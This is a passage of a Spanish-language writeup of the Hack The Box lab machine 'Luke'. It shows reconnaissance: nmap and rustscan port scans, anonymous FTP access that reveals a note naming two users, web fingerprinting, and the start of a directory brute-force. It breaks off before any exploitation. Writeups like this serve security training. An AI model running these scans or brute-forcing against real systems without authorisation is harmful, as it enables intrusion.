<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: Luke Writeup | Medium&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: Luke Writeup | Medium"
/>
<meta
  name="description"
  content="Hack The Box: Luke Writeup
Welcome to my detailed writeup of the medium difficulty machine &ldquo;Luke&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration






1$ rustscan -a 10.129.96.55 --ulimit 5000 -g 
210.129.96.55 -&gt; [21,22,80,3000,8000]






 1$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST
 3Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 4Service scan Timing: About 80.00% done; ETC: 22:32 (0:00:35 remaining)
 5Nmap scan report for 10.129.96.55
 6Host is up (0.036s latency).
 7
 8PORT     STATE SERVICE VERSION
 921/tcp   open  ftp     vsftpd 3.0.3&#43; (ext.1)
10| ftp-syst: 
11|   STAT: 
12| FTP server status:
13|      Connected to 10.10.14.18
14|      Logged in as ftp
15|      TYPE: ASCII
16|      No session upload bandwidth limit
17|      No session download bandwidth limit
18|      Session timeout in seconds is 300
19|      Control connection is plain text
20|      Data connections will be plain text
21|      At session startup, client count was 2
22|      vsFTPd 3.0.3&#43; (ext.1) - secure, fast, stable
23|_End of status
24| ftp-anon: Anonymous FTP login allowed (FTP code 230)
25|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
2622/tcp   open  ssh?
27|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
2880/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
29|_http-title: Luke
30| http-methods: 
31|_  Potentially risky methods: TRACE
32|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
333000/tcp open  http    Node.js Express framework
34|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8).
358000/tcp open  http    Ajenti http control panel
36|_http-title: Ajenti
37
38Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
39Nmap done: 1 IP address (1 host up) scanned in 182.03 seconds
UDP Enumeration






1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.55 -oN allPorts.UDP
2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST
3Nmap scan report for 10.129.96.55
4Host is up (0.055s latency).
5All 1500 scanned ports on 10.129.96.55 are in ignored states.
6Not shown: 1305 open|filtered udp ports (no-response), 195 closed udp ports (port-unreach)
7
8Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
FTP Enumeration
Podemos iniciar sesiÃ³n de forma anÃ³nima en el FTP, encontramos un archivo llamado for_Chihiro.txt"
/>
<meta
  name="keywords"
  content="HackTheBox,Luke,Writeup,Cybersecurity,Penetration Testing,CTF,Privilege Escalation,RCE,Exploit,FreeBSD,Web Fuzzing,Information Leakage,Password Spraying,Abusing API,Bruteforcing,Abusing Ajenti Terminal,"
/>

  <meta name="author" content="AndrÃ©s Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/luke---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: Luke Writeup | Medium">
  <meta property="og:description" content="Hack The Box: Luke Writeup Welcome to my detailed writeup of the medium difficulty machine â€œLukeâ€ on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.96.55 --ulimit 5000 -g 210.129.96.55 -&gt; [21,22,80,3000,8000]1$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST 3Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan 4Service scan Timing: About 80.00% done; ETC: 22:32 (0:00:35 remaining) 5Nmap scan report for 10.129.96.55 6Host is up (0.036s latency). 7 8PORT STATE SERVICE VERSION 921/tcp open ftp vsftpd 3.0.3&#43; (ext.1) 10| ftp-syst: 11| STAT: 12| FTP server status: 13| Connected to 10.10.14.18 14| Logged in as ftp 15| TYPE: ASCII 16| No session upload bandwidth limit 17| No session download bandwidth limit 18| Session timeout in seconds is 300 19| Control connection is plain text 20| Data connections will be plain text 21| At session startup, client count was 2 22| vsFTPd 3.0.3&#43; (ext.1) - secure, fast, stable 23|_End of status 24| ftp-anon: Anonymous FTP login allowed (FTP code 230) 25|_drwxr-xr-x 2 0 0 512 Apr 14 2019 webapp 2622/tcp open ssh? 27|_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 2880/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 29|_http-title: Luke 30| http-methods: 31|_ Potentially risky methods: TRACE 32|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 333000/tcp open http Node.js Express framework 34|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). 358000/tcp open http Ajenti http control panel 36|_http-title: Ajenti 37 38Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 39Nmap done: 1 IP address (1 host up) scanned in 182.03 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.55 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST 3Nmap scan report for 10.129.96.55 4Host is up (0.055s latency). 5All 1500 scanned ports on 10.129.96.55 are in ignored states. 6Not shown: 1305 open|filtered udp ports (no-response), 195 closed udp ports (port-unreach) 7 8Nmap done: 1 IP address (1 host up) scanned in 0.80 secondsFTP Enumeration Podemos iniciar sesiÃ³n de forma anÃ³nima en el FTP, encontramos un archivo llamado for_Chihiro.txt">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-05T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Luke">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: Luke Writeup | Medium">
  <meta name="twitter:description" content="Hack The Box: Luke Writeup Welcome to my detailed writeup of the medium difficulty machine â€œLukeâ€ on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.96.55 --ulimit 5000 -g 210.129.96.55 -&gt; [21,22,80,3000,8000]1$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST 3Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan 4Service scan Timing: About 80.00% done; ETC: 22:32 (0:00:35 remaining) 5Nmap scan report for 10.129.96.55 6Host is up (0.036s latency). 7 8PORT STATE SERVICE VERSION 921/tcp open ftp vsftpd 3.0.3&#43; (ext.1) 10| ftp-syst: 11| STAT: 12| FTP server status: 13| Connected to 10.10.14.18 14| Logged in as ftp 15| TYPE: ASCII 16| No session upload bandwidth limit 17| No session download bandwidth limit 18| Session timeout in seconds is 300 19| Control connection is plain text 20| Data connections will be plain text 21| At session startup, client count was 2 22| vsFTPd 3.0.3&#43; (ext.1) - secure, fast, stable 23|_End of status 24| ftp-anon: Anonymous FTP login allowed (FTP code 230) 25|_drwxr-xr-x 2 0 0 512 Apr 14 2019 webapp 2622/tcp open ssh? 27|_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 2880/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 29|_http-title: Luke 30| http-methods: 31|_ Potentially risky methods: TRACE 32|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 333000/tcp open http Node.js Express framework 34|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). 358000/tcp open http Ajenti http control panel 36|_http-title: Ajenti 37 38Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 39Nmap done: 1 IP address (1 host up) scanned in 182.03 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.55 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST 3Nmap scan report for 10.129.96.55 4Host is up (0.055s latency). 5All 1500 scanned ports on 10.129.96.55 are in ignored states. 6Not shown: 1305 open|filtered udp ports (no-response), 195 closed udp ports (port-unreach) 7 8Nmap done: 1 IP address (1 host up) scanned in 0.80 secondsFTP Enumeration Podemos iniciar sesiÃ³n de forma anÃ³nima en el FTP, encontramos un archivo llamado for_Chihiro.txt">





  <meta itemprop="name" content="Hack The Box: Luke Writeup | Medium">
  <meta itemprop="description" content="Hack The Box: Luke Writeup Welcome to my detailed writeup of the medium difficulty machine â€œLukeâ€ on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.96.55 --ulimit 5000 -g 210.129.96.55 -&gt; [21,22,80,3000,8000]1$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST 3Stats: 0:02:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan 4Service scan Timing: About 80.00% done; ETC: 22:32 (0:00:35 remaining) 5Nmap scan report for 10.129.96.55 6Host is up (0.036s latency). 7 8PORT STATE SERVICE VERSION 921/tcp open ftp vsftpd 3.0.3&#43; (ext.1) 10| ftp-syst: 11| STAT: 12| FTP server status: 13| Connected to 10.10.14.18 14| Logged in as ftp 15| TYPE: ASCII 16| No session upload bandwidth limit 17| No session download bandwidth limit 18| Session timeout in seconds is 300 19| Control connection is plain text 20| Data connections will be plain text 21| At session startup, client count was 2 22| vsFTPd 3.0.3&#43; (ext.1) - secure, fast, stable 23|_End of status 24| ftp-anon: Anonymous FTP login allowed (FTP code 230) 25|_drwxr-xr-x 2 0 0 512 Apr 14 2019 webapp 2622/tcp open ssh? 27|_ssh-hostkey: ERROR: Script execution failed (use -d to debug) 2880/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 29|_http-title: Luke 30| http-methods: 31|_ Potentially risky methods: TRACE 32|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 333000/tcp open http Node.js Express framework 34|_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). 358000/tcp open http Ajenti http control panel 36|_http-title: Ajenti 37 38Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 39Nmap done: 1 IP address (1 host up) scanned in 182.03 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.55 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST 3Nmap scan report for 10.129.96.55 4Host is up (0.055s latency). 5All 1500 scanned ports on 10.129.96.55 are in ignored states. 6Not shown: 1305 open|filtered udp ports (no-response), 195 closed udp ports (port-unreach) 7 8Nmap done: 1 IP address (1 host up) scanned in 0.80 secondsFTP Enumeration Podemos iniciar sesiÃ³n de forma anÃ³nima en el FTP, encontramos un archivo llamado for_Chihiro.txt">
  <meta itemprop="datePublished" content="2024-08-05T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-05T00:00:00+00:00">
  <meta itemprop="wordCount" content="1588">
  <meta itemprop="keywords" content="HackTheBox,Luke,Writeup,Cybersecurity,Penetration Testing,CTF,Privilege Escalation,RCE,Exploit,FreeBSD,Web Fuzzing,Information Leakage,Password Spraying,Abusing API,Bruteforcing,Abusing Ajenti Terminal">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: Luke Writeup | Medium</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-luke-writeup">Hack The Box: Luke Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Luke&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.96.55 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.96.55 -&gt; [21,22,80,3000,8000]</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:29 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Stats: 0:02:18 elapsed; <span style="color:#ff0;font-weight:bold">0</span> hosts completed (<span style="color:#ff0;font-weight:bold">1</span> up), <span style="color:#ff0;font-weight:bold">1</span> undergoing Service Scan
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Service scan Timing: About 80.00% <span style="color:#fff;font-weight:bold">done</span>; ETC: 22:32 (0:00:35 remaining)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.96.55
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Host is up (0.036s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>| ftp-syst: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|   STAT: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>| FTP server status:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|      Connected to 10.10.14.18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|      Logged in as ftp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>|      TYPE: ASCII
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>|      No session upload bandwidth limit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>|      No session download bandwidth limit
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|      Session timeout in seconds is <span style="color:#ff0;font-weight:bold">300</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|      Control connection is plain text
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>|      Data connections will be plain text
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>|      At session startup, client count was <span style="color:#ff0;font-weight:bold">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>|_End of status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|_drwxr-xr-x    <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#ff0;font-weight:bold">0</span>        <span style="color:#ff0;font-weight:bold">0</span>             <span style="color:#ff0;font-weight:bold">512</span> Apr <span style="color:#ff0;font-weight:bold">14</span>  <span style="color:#ff0;font-weight:bold">2019</span> webapp
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>22/tcp   open  ssh?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>|_http-title: Luke
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>| http-methods: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>3000/tcp open  http    Node.js Express framework
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>|_http-title: Site doesn<span style="color:#f00">&#39;</span>t have a title (application/json; charset=utf-8).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>8000/tcp open  http    Ajenti http control panel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>|_http-title: Ajenti
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 182.03 seconds</span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.96.55 -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:33 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.96.55
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up (0.055s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>All <span style="color:#ff0;font-weight:bold">1500</span> scanned ports on 10.129.96.55 are in ignored states.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1305</span> open|filtered udp ports (no-response), <span style="color:#ff0;font-weight:bold">195</span> closed udp ports (port-unreach)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 0.80 seconds</span></span></code></pre></div>
<h1 id="ftp-enumeration">FTP Enumeration</h1>
<p>Podemos iniciar sesiÃ³n de forma anÃ³nima en el FTP, encontramos un archivo llamado <code>for_Chihiro.txt</code></p>






<pre tabindex="0"><code>Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I&#39;ve created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 

Derry</code></pre>
<p>De este mensaje podemos sacar la conclusiÃ³n de que existen dos usuarios, <code>chihiro</code> y <code>derry</code> y de que en alguna parte debe de haber recursos que no deberÃ­an de estar debido a las polÃ­ticas de seguridad.</p>
<h1 id="80tcp-enumeration">80/TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://10.129.96.55
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://10.129.96.55 [<span style="color:#ff0;font-weight:bold">200</span> OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], Email[contact@luke.io], HTML5, HTTPServer[FreeBSD][Apache/2.4.38 (FreeBSD) PHP/7.3.3], IP[10.129.96.55], JQuery, PHP[7.3.3], Script, Title[Luke]</span></span></code></pre></div>
<p>Encontramos el dominio <code>luke.io</code></p>
<p>Vemos que se estÃ¡ utilizando PHP por detrÃ¡s.</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ feroxbuster -u http://10.129.96.55 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -d <span style="color:#ff0;font-weight:bold">2</span> -t <span style="color:#ff0;font-weight:bold">100</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>                                                                                          
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> ___  ___  __   __     __      __         __   ___
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>|__  |__  |__) |__) | /  <span style="color:#0ff;font-weight:bold">`</span>    /  <span style="color:#0ff;font-weight:bold">\ \_</span>/ | |  <span style="color:#0ff;font-weight:bold">\ </span>|__
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>|    |___ |  <span style="color:#0ff;font-weight:bold">\ </span>|  <span style="color:#0ff;font-weight:bold">\ </span>| <span style="color:#0ff;font-weight:bold">\_</span>_,    <span style="color:#0ff;font-weight:bold">\_</span>_/ / <span style="color:#0ff;font-weight:bold">\ </span>| |__/ |___
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>by Ben <span style="color:#0ff;font-weight:bold">&#34;epi&#34;</span> Risher ğŸ¤“                 ver: 2.10.4
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span> ğŸ¯  Target Url            â”‚ http://10.129.96.55
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span> ğŸš€  Threads               â”‚ <span style="color:#ff0;font-weight:bold">100</span>
